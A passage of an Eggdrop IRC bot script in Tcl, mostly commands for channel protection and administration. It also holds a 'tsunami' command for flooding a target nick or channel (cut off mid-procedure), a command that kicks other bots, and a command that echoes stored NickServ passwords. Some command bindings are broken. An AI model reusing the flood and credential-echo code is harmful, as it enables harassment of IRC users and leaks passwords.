  setuser "config" XTRA "NICK" [zip $bnick] ; setuser "config" XTRA "NICKPASS" [zip $bpass]
  saveuser ; set nick $bnick ; set nickpass $bpass
  putsrv "NickServ identify $bnick $bpass" ; puthlp "NOTICE $unick :BoTNIcK $bnick"
}
## botaltnick
bind msg Z botaltnick msg_botaltnick
proc msg_botaltnick {unick uhost hand rest} {
  global botnick altnick altpass notc 
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set baltnick [lindex $rest 0]
  set baltpass [lindex $rest 1]
  if {$baltnick == "" || $baltpass == ""} { puthlp "NOTICE $unick :Usage: botaltnick <nick> <identify>" ; return 0 } 
  setuser "config" XTRA "ALTNICK" [zip $baltnick]
  setuser "config" XTRA "ALTPASS" [zip $baltpass]
  saveuser ; set altnick $baltnick ; set altpass $baltpass ; puthlp "NOTICE $unick :BoTALTNIcK $baltnick"
}
## botset
bind msg Z botset msg_botset
proc msg_botset {unick uhost hand rest} {
  global nick nickpass altpass altnick nwo notc 
  if {$unick != $nwo} { return 0 }
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  puthlp "NOTICE $unick :1st $nick ($nickpass) 2nd $altnick ($altpass)"
  return 0
}
## realname
bind msg Z realname msg_realname
proc msg_realname {unick uhost hand rest} {
  global realname notc owner squ
  if {$unick != $owner &&  $unick != $squ} { puthlp "NOTICE $unick :4DeNiEd..!" ; return 0 }
  if {![matchattr $unick Q]} { puthlp "NOTICE $unick :4auth 1st!" ; return 0 }
  set curtime [ctime [unixtime]]
  if {$rest == ""} { setuser "config" XTRA "REALNAME" "" } { setuser "config" XTRA "REALNAME" [zip $rest] }
  saveuser ; set realname $rest ; putsrv "QUIT :cHaNgINg ReaLName... (on $curtime)"
}
## ident
bind msg Z ident msg_ident
proc msg_ident {unick uhost hand rest} {
  global username notc owner squ
  if {$unick != $owner &&  $unick != $squ} { puthlp "NOTICE $unick :4DeNiEd..!" ; return 0 }
  if {![matchattr $unick Q]} { puthlp "NOTICE $unick :4auth 1st!" ; return 0 }
  set curtime [ctime [unixtime]]
  if {$rest == ""} { setuser "config" XTRA "USERNAME" "" } { if {[regexp \[^a-z\] [string tolower $rest]]} { puthlp "NOTICE $unick :4DeNiEd..! use character for ident." ; return 0 } ; setuser "config" XTRA "USERNAME" [zip $rest] }
  saveuser ; set username $rest ; putsrv "QUIT :cHaNgINg IdEnt... (on $curtime)"
}
## die / kill bot
bind msg Z die msg_die
proc msg_die {nick uhost hand rest} {
  global notc owner squ
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set curtime [ctime [unixtime]]
  if {$nick != $owner &&  $nick != $squ} { puthlp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  foreach x [userlist] {
    if {$x != "AKICK"} {
      chattr $x -Q
      foreach y [getuser $x HOSTS] { delhost $x $y }
      set hostmask "${x}!*@*"
      setuser $x HOSTS $hostmask
  } }
  saveuser ; if {$rest != ""} { set rest " $rest" } ; putsrv "QUIT :SHuTiNgDown... (on $curtime)" ; utimer 5 dies
}
bind pub Z die pub_die
proc pub_die {nick uhost hand chan rest} {
  global botnick squ notc owner
  set curtime [ctime [unixtime]]
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$nick != $owner &&  $nick != $squ} { puthlp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {$rest != ""} { set rest " $rest" }
  putsrv "QUIT :SHuTiNgDown... (on $curtime)"
  utimer 5 dies
  return 0
}
proc dies {} { global squ owner notc ; if {$squ != $owner && [validuser $squ]} { deluser $squ } ; die }
## +/- forced
bind msg Z +forced pub_+forced
bind pub Z `+forced pub_+forced
proc pub_+forced {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag +M
  puthlp "NOTICE $nick :forced $chan \[9ON\]"
  saveuser
}
bind msg Z -forced pub_-forced
bind pub Z `-forced pub_-forced
proc pub_-forced {nick uhost hand chan rest} {
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  global notc
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -M
  puthlp "NOTICE $nick :forced $chan \[4OFF\]"
  saveuser
}
## +/- colour
bind msg Z -colour pub_-colour
bind pub Z `-colour pub_-colour
proc pub_-colour {nick uhost hand chan rest} {
  global notc kickclr
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set kickclr "T"
  setuser "config" XTRA "KCLR" "Y"
  puthlp "NOTICE $nick :colour kick \[4OFF\]"
  saveuser
}
bind msg Z +colour pub_+colour
bind pub Z `+colour pub_+colour
proc pub_+colour {nick uhost hand chan rest} {
  global notc kickclr
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  catch {unset kickclr}
  setuser "config" XTRA "KCLR" ""
  puthlp "NOTICE $nick :colour kick \[9ON\]"
  saveuser
}
## +/- greet
bind msg Z +greet pub_+greet
bind pub Z `+greet pub_+greet
proc pub_+greet {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest==""} { puthlp "NOTICE $nick :Usage +greet <msg>" ; return 0 }
  chattr $cflag +G
  setuser $cflag XTRA "GREET" $rest
  puthlp "NOTICE $nick :AuTOGReeT $chan \[$rest\]"
  saveuser
}
bind msg Z -greet pub_-greet
bind pub Z `-greet pub_-greet
proc pub_-greet {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -G
  setuser $cflag XTRA "GREET" ""
  puthlp "NOTICE $nick :AuTOGReeT $chan \[4OFF\]"
  saveuser
}
## +/- repeat
bind pub Z `+repeat pub_+repeat
proc pub_+repeat {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :Usage +repeat <max>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :cAnT UsE NuLL" ; return 0 }
  chattr $cflag +R
  setuser $cflag XTRA "RPT" $rest
  puthlp "NOTICE $nick :RePeaT $chan MaX \[9$rest\]"
  saveuser
}
bind pub Z -repeat pub_-repeat
proc pub_-repeat {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -R
  setuser $cflag XTRA "RPT" ""
  puthlp "NOTICE $nick :RePeaT $chan \[4OFF\]"
  saveuser
}
## +/- text
bind pub Z `+text pub_+text
proc pub_+text {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :Usage +text <max>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :cAnT UsE NuLL" ; return 0 }
  chattr $cflag +T
  setuser $cflag XTRA "CHAR" $rest
  puthlp "NOTICE $nick :TexT $chan MaX \[9$rest\]"
  saveuser
}
bind pub Z `-text pub_-text
proc pub_-text {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -T
  setuser $cflag XTRA "CHAR" ""
  puthlp "NOTICE $nick :TexT $chan \[4OFF\]"
  saveuser
}
## +/- limit
bind pub Z `+limit pub_+limit
proc pub_+limit {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == "" || ![isnumber $rest]} { puthlp "NOTICE $nick :Usage: +limit <number>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :cAnT UsE NuLL" ; return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag +L
  setuser $cflag XTRA "LIMIT" $rest
  puthlp "NOTICE $nick :LImIT $chan \[9$rest\]"
  saveuser
}
bind pub Z `-limit pub_-limit
proc pub_-limit {nick uhost hand chan rest} {
  global notc lst_limit
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -L
  setuser $cflag XTRA "LIMIT" ""
  puthlp "NOTICE $nick :LImIT $chan \[4OFF\]"
  catch { lst_limit($chan) }
  saveuser
}
## +/- caps
bind pub Z `+caps pub_+caps
proc pub_+caps {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :Usage +caps <%percent>" ; return 0 }
  if {$rest == 0 || $rest > 100} { puthlp "NOTICE $nick :fill under 1 - 100%" ; return 0 }
  chattr $cflag +U
  setuser $cflag XTRA "CAPS" $rest
  puthlp "NOTICE $nick :CAPS $chan \[9$rest%\]"
  saveuser
}
bind pub Z `-caps pub_-caps
proc pub_-caps {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -U
  setuser $cflag XTRA "CAPS" ""
  puthlp "NOTICE $nick :cAPs $chan \[4OFF\]"
  saveuser
}
## +/- clone
bind pub Z `+clone pub_+clone
proc pub_+clone {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :Usage +clone <max>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :cAnT UsE NuLL" ; return 0 }
  chattr $cflag +O
  setuser $cflag XTRA "CLONE" $rest
  puthlp "NOTICE $nick :cLonE $chan MaX \[9$rest\]"
  saveuser
}
bind pub Z `-clone pub_-clone
proc pub_-clone {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -O
  setuser $cflag XTRA "CLONE" ""
  puthlp "NOTICE $nick :cLonE $chan \[4OFF\]"
  saveuser
}
## +/- reop
bind pub Z `+reop pub_+reop
proc pub_+reop {nick uhost hand chan rest} {
  global notc
  if {![string match "*protectfriends*" [channel info $chan]]} { puthlp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }  
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-protectfriends*" [channel info $chan]]} { puthlp "NOTICE $nick :Re@p $chan IS \[9ON\]" ; return 0 }  
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  catch { channel set $chan -protectfriends }
  puthlp "NOTICE $nick :Re@p $chan \[9ON\]"
  savechan
}
bind pub Z `-reop pub_-reop
proc pub_-reop {nick uhost hand chan rest} {
  global notc
  if {![string match "*protectfriends*" [channel info $chan]]} { puthlp "NOTICE $nick :FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+protectfriends*" [channel info $chan]]} { puthlp "NOTICE $nick :Re@p $chan IS \[4OFF\]" ; return 0 }  
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  catch { channel set $chan +protectfriends }
  puthlp "NOTICE $nick :Re@p $chan \[4OFF\]"
  savechan
  return 0
}
## +/- joinpart
bind pub Z `+joinpart pub_+joinpart
proc pub_+joinpart {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :Usage +joinpart <seconds>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :cAnT UsE NuLL" ; return 0 }
  chattr $cflag +P
  setuser $cflag XTRA "JP" $rest
  puthlp "NOTICE $nick :JoINPaRT $chan \[9$rest Sec's\]"
  saveuser
}
bind msg Z `-joinpart pub_-joinpart
proc pub_-joinpart {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -P
  setuser $cflag XTRA "JP" ""
  puthlp "NOTICE $nick :JoINPaRT $chan \[4OFF\]"
  saveuser
}
## +/- spam
bind msg Z +spam pub_+spam
bind pub Z `+spam pub_+spam
proc pub_+spam {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} {
    foreach x [userlist A] { chattr $x +S }
    puthlp "NOTICE $nick :ALL SpaM CHaNNeL \[9ON\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[matchattr $cflag S]} { puthlp "NOTICE $nick :SpaM $chan \[9ON\]" ; return 0 }  
  chattr $cflag +S
  puthlp "NOTICE $nick :SpaM $chan \[9ON\]"
  saveuser
}
bind msg Z -spam pub_-spam
bind pub Z `-spam pub_-spam
proc pub_-spam {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} { foreach x [userlist A] { chattr $x -S } ; puthlp "NOTICE $nick :ALL SpaM CHaNNeL \[4OFF\]" ; return 0 }
  if {![validchan $chan]} { return 0 }
  if {![matchattr $cflag S]} { puthlp "NOTICE $nick :SpaM $chan \[4OFF\]" ; return 0 }  
  chattr $cflag -S
  puthlp "NOTICE $nick :SpaM $chan \[4OFF\]"
  saveuser
}
## +/- joinpart
bind pub Z `+joinpart pub_+joinpart
proc pub_+massjoin {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} {
    foreach x [userlist A] { chattr $x +J }
    puthlp "NOTICE $nick :ALL MaSsJoIN CHaNNeL \[9ON\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[matchattr $cflag J]} { puthlp "NOTICE $nick :MaSsJoIN $chan \[9ON\]" ; return 0 }  
  chattr $cflag +J
  puthlp "NOTICE $nick :MaSsJoIN $chan \[9ON\]"
  saveuser
}
bind pub Z `-joinpart pub_-joinpart
proc pub_-massjoin {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} { foreach x [userlist A] { chattr $x -J } ; puthlp "NOTICE $nick :ALL MaSsJoIN CHaNNeL \[9ON\]" ; return 0 }
  if {![validchan $chan]} { return 0 }
  if {![matchattr $cflag J]} { puthlp "NOTICE $nick :MaSsJoIN $chan \[4OFF\]" ; return 0 }  
  chattr $cflag -J
  puthlp "NOTICE $nick :MaSsJoIN $chan \[4OFF\]"
  saveuser
}
## +/- key
bind pub Z `+key pub_+key
proc pub_+key {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  set rest [lindex $rest 0]
  if {$rest==""} { puthlp "NOTICE $nick :Usage +key <word>" ; return 0 }
  chattr $cflag +K
  setuser $cflag XTRA "CI" [zip $rest]
  puthlp "NOTICE $nick :KeY $chan \[9$rest\]"
  saveuser
}
bind pub Z `-key pub_-key
proc pub_-key {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -K
  setuser $cflag XTRA "CI" ""
  puthlp "NOTICE $nick :KeY $chan \[4OFF\]"
  saveuser
}
## +/- revenge
bind msg Z +revenge pub_+revenge
bind pub Z `+revenge pub_+revenge
proc pub_+revenge {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag +D
  puthlp "NOTICE $nick :revenge $chan \[9ON\]"
  saveuser
}
bind msg Z -revenge pub_-revenge
bind pub Z `-revenge pub_-revenge
proc pub_-revenge {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -D
  puthlp "NOTICE $nick :revenge $chan \[4OFF\]"
  saveuser
}
## +/- badword
bind msg Z +badword pub_+badword
bind pub Z `+badword pub_+badword
proc pub_+badword {nick uhost hand chan rest} {
  global badwords notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: `+badword <badword>" ; return 0 }
  if {[string match "*[string tolower [lindex $rest 0]]*" $badwords]} { puthlp "NOTICE $nick :[lindex $rest 0] Allready Added" ; return 0 }
  append badwords " [string tolower [lindex $rest 0]]"
  setuser "config" XTRA "BADWORDS" $badwords
  saveuser
  puthlp "NOTICE $nick :Added [lindex $rest 0] to badwords"
  return 0
}
bind msg Z -badword pub_-badword
bind pub Z `-badword pub_-badword
proc pub_-badword {nick uhost hand chan rest} {
  global badwords notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: `-badword <badword>" ; return 0 }
  set val ""
  foreach badword [string tolower $badwords] { if {[string tolower [lindex $rest 0]] == $badword} { puthlp "NOTICE $nick :Removed [lindex $rest 0]" } else { append val " $badword " } }
  set badwords $val
  setuser "config" XTRA "BADWORDS" $val
  saveuser
  return 0
}
## badword
bind pub Z `badwords pub_badwords
proc pub_badwords {nick uhost hand chan rest} {
  global badwords notc 
  set retval "BaDWoRDS: "
  foreach badword [string tolower $badwords] { append retval "$badword " }
  puthlp "NOTICE $nick :$retval"
  return 0
}
## advword
bind pub Z `advwords pub_advwords
proc pub_advwords {nick uhost hand chan rest} {
  global advwords notc
  set retval "adVWoRDS: "
  foreach advword [string tolower $advwords] { append retval "$advword " }
  puthlp "NOTICE $nick :$retval"
  return 0
}
bind msg Z +advword pub_+advword
bind pub Z `+advword pub_+advword
proc pub_+advword {nick uhost hand chan rest} {
  global advwords notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: `+advword <advword>" ; return 0 }
  if {[string match "*[string tolower [lindex $rest 0]]*" $advwords]} { puthlp "NOTICE $nick :[lindex $rest 0] allready added" ; return 0 }
  append advwords " [string tolower [lindex $rest 0]]"
  setuser "config" XTRa "aDVWORDS" $advwords
  saveuser
  puthlp "NOTICE $nick :added [lindex $rest 0] to advwords"
  return 0
}
bind msg Z -advword pub_-advword
bind pub Z `-advword pub_-advword
proc pub_-advword {nick uhost hand chan rest} {
  global advwords notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: `-advword <advword>" ; return 0 }
  set val ""
  foreach advword [string tolower $advwords] { if {[string tolower [lindex $rest 0]] == $advword} { puthlp "NOTICE $nick :Removed [lindex $rest 0]" } else { append val " $advword " } }
  set advwords $val
  setuser "config" XTRa "aDVWORDS" $val
  saveuser
  return 0
}
## nobot
bind pub Z `nobot pub_bobot
proc pub_nobot {nick uhost hand chan rest} {
  global botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {![isop $botnick $chan]} { return 0 }
  if {[isutimer "pub_nobot"]} { return 0 }
  if {[rand 2] <= 1} { puthlp "PRIVMSG $chan :\001USERINFO\001" } { puthlp "PRIVMSG $chan :\001CLIENTINFO\001" }
  return 0
}
bind ctcr - USERINFO ui_reply
bind ctcr - CLIENTINFO ui_reply
proc ui_reply {nick uhost hand dest key arg} {
  global botnick bannick notc ismaskhost
  if {![string match "*eggdrop*" $arg]} { return 0 }
  if {$nick == $botnick || [matchattr $nick f]} { return 0 }
  foreach x [channels] {
    if {[onchan $nick $x] && [isop $botnick $x] && ![isop $nick $x]} {
      if {[info exists ismaskhost]} { set bannick($nick) [maskhost "*!*[string range $uhost [string first "@" $uhost] end]"] } { set bannick($nick) "*!*[string range $uhost [string first "@" $uhost] end]" }
      putsrv "KICK $x $nick :2$x1 forbidden for 2eggy1 due to lame anticipated"
      return 0
} } }
## sdeop
bind pub Z `sdeop pub_sdeop
proc pub_sdeop {nick uhost hand chan rest} {
  global notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest != ""} { set chan $rest }
  if {[isop $botnick $chan]} { puthelp "mode $chan +v-ko $botnick 6admin.request $botnick" }
}
## chanmode
bind msg Z `chanmode pub_chanmode
bind pub Z `chanmode pub_chanmode
proc pub_chanmode {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == ""} { puthelp "NOTICE $nick :Usage: chanmode #channel +ntsmklic" ; return 0 }
  if {[string index [lindex $rest 0] 0] == "#"} {
    if {![validchan [lindex $rest 0]]} { puthlp "NOTICE $nick :NoT IN [lindex $rest 0]" ; return 0 }
    set chan [lindex $rest 0] ; set rest [lrange $rest 1 end]
  }
  if {![validchan $chan]} { puthlp "NOTICE $nick :$chan <n/a>" } else { catch { channel set $chan chanmode $rest }
    savechan
    puthelp "NOTICE $nick :$chan set modes \[$rest\]"
  }
  return 0
}
## chanset
bind msg Z `chanset pub_chanset
bind pub Z `chanset pub_chanset
proc pub_chanset {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  set channel [lindex $rest 0]
  set options [string tolower [lindex $rest 1]]
  set number "0"
  if {$options == "deop" || $options == "kick" || $options == "join" || $options == "line" || $options == "nick" || $options == "ctcp"} { set number [lindex $rest 2] }
  if {($channel == "") || ($options == "")} { puthlp "NOTICE $nick :Usage: chanset #channel <option...>" ; return 0 }
  if {![string match "*-*" $options] && ![string match "*+*" $options] && ![string match "*:*" $number]} { puthlp "NOTICE $nick :Usage: chanset #channel <deop|ctcp|kick|join|line|nick> <howmanytimes:seconds>" ; return 0 }
  if {[validchan $channel]} {
    if {$options == "deop"} { catch { channel set $channel flood-deop $number } ; puthlp "NOTICE $nick :set deop flood \[$number\] on $channel"
      } elseif {$options == "kick"} { catch { channel set $channel flood-kick $number } ; puthlp "NOTICE $nick :set kick flood \[$number\] on $channel"
      } elseif {$options == "join"} { catch { channel set $channel flood-join $number } ; puthlp "NOTICE $nick :set join flood \[$number\] on $channel"
      } elseif {$options == "line"} { catch { channel set $channel flood-chan $number } ; puthlp "NOTICE $nick :set line flood \[$number\] on $channel"
      } elseif {$options == "nick"} { catch { channel set $channel flood-nick $number } ; puthlp "NOTICE $nick :set nick flood \[$number\] on $channel"
      } elseif {$options == "ctcp"} { catch { channel set $channel flood-ctcp $number } ; puthlp "NOTICE $nick :set ctcp flood \[$number\] on $channel"
    } else { catch { channel set $channel ${options} } ; puthelp "NOTICE $nick :Successfully set modes \[${options}\] on $channel" ; savechan }
  } else { puthlp "NOTICE $nick :$channel <n/a>"  }
}
## chansetall
bind msg Z `chansetall pub_chansetall
bind pub Z `chansetall pub_chansetall
proc pub_chansetall {nick uhost hand chan rest} {
  global botnick notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: chansetall <option>" ; return 0 }
  foreach x [channels] { catch { channel set $x $rest } }
  savechan
  puthelp "NOTICE $nick :Set all channels mode \{ $rest \}"
  return 0
}
## chanreset
bind msg Z `chanreset pub_chanreset
bind pub Z `chanreset pub_chanreset
proc pub_chanreset {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: chanreset <#|ALL>" ; return 0 }
  set chan [lindex $rest 0]
  if {[string tolower $chan] == "all"} {
    puthlp "NOTICE $nick :ReSeT ALL DeFauLT FLAg"
    foreach x [channels] {
      catch { channel set $x -statuslog -revenge -protectops -clearbans +cycle -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
      catch { channel set $x -nodesynch +trojan +echox -split }
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      chattr $cflag "-hp+AJSPTRUED"
      setuser $cflag XTRA "JP" 5
      setuser $cflag XTRA "CHAR" 250
      setuser $cflag XTRA "RPT" 5
      setuser $cflag XTRA "CAPS" 80
    }
    savechan
    return 0
  }
  if {[string first # $chan]!=0} { set chan "#$chan" }
  puthlp "NOTICE $nick :ReSeT cHaNNeL \[$chan\] DeFauLT FLAg"
  if {![validchan $chan]} { puthlp "NOTICE $nick :UnFIndEd $chan." ; return 0 }
  catch { channel set $chan -statuslog -revenge -protectops +cycle -clearbans -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
  catch { channel set $chan -nodesynch +trojan +echox -split }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag "-hp+AJSPTRUED"
  setuser $cflag XTRA "JP" 5
  setuser $cflag XTRA "CHAR" 250
  setuser $cflag XTRA "RPT" 5
  setuser $cflag XTRA "CAPS" 80
  savechan
}
## tsunami
bind pub - `tsunami pub_tsunami
proc pub_tsunami {nick uhost hand channel rest} {
  global cmd_chn cmd_by cmd_msg cmd_case botnick version notc quick squ
  set person [lindex $rest 0]
  set rest [lrange $rest 1 end]
  if {$person == $botnick} { return 0 }
  if {[string index $person 0] == "#"} {
    if {[validchan $person]} {
      if {[isop $botnick $person] && ![matchattr $nick m]} {
        if {[isutimer "IN PROGRESS"]} { return 0 }
        utimer 20 [list putlog "IN PROGRESS"]
        putsrv "KICK $channel $nick :1channel 2flood1 protection"
        return 0
  } } }
  if {[matchattr $person n] && ![matchattr $nick Z]} {
    if {[isop $botnick $channel]} { putsrv "KICK $channel $nick :1admin 2flood1 protection" }
    if {[istimer "IN PROGRESS"]} { return 0 }
    timer 2 [list putlog "IN PROGRESS"]
    putsrv "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
    puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
    puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
    puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
    return 0
  }
  if {![matchattr $nick Z]} { return 0 } 
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: tsunami <nick/#> <msg>" ; return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 } 
  if {[string tolower $person] == [string tolower $squ]} { return 0 }
  if {[string index $person 0] == "#"} {
    if {![validchan $person]} {
      pub_randnick $nick $uhost $hand $channel ""
      set cmd_chn $person
      set cmd_msg $rest
      set cmd_by $nick
      set cmd_case "1"
      channel add $person
      catch { channel set $person +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
      return 0
  } }
  catch { clearqueue all }
  pub_randnick $nick $uhost $hand $channel ""
  if {[string index $person 0] == "#"} { setignore "*!*@*" "*" 120 }
